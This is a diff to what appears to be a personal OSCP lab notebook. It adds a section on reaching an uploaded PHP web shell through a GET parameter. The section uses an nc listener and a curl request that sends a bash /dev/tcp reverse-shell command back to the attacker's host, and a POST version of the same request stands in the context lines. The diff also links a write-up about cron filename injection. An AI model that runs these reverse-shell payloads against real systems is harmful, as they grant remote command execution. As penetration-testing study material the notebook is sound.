@@ -58,6 +58,16 @@ curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Po
 > [!warning] 💡
 > `/dev/tcp` requires Bash. If the endpoint invokes `/bin/sh` or the callback fails, use a POSIX FIFO plus netcat payload and URL-encode the complete body.
 
+## GET-controlled PHP web shell
+
+Some uploaded shells read `cmd` from `$_GET` instead of POST data. Use `-G` with `--data-urlencode` so shell metacharacters remain a single query parameter.
+
+> **Why:** This request matches a GET-based webshell and safely proves the callback command is delivered as one parameter.
+```bash
+nc -lvnp $Port
+curl -sS -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" "http://$BoxIP/$Path" >/dev/null
+```
+
 ## Notes
 
 Only run the interpreter command that matches the exploit file. For reverse shells use RevShells to generate the payload matching the available interpreter (`bash`, `python3`, `perl`, `php`).
@@ -100,6 +110,7 @@ python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
 - [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- phpbash POST callback produced a `www-data` shell
 - [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- PHP command shell callback produced a `www-data` foothold
 - [[OSCP/BOXES/WRITE UPS/Linux/SwagShop|SwagShop]] -- authenticated Magento RCE produced a FIFO/Netcat `www-data` shell
+- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- cron filename injection produced a `guly` reverse shell
 
 ## Related stages
 
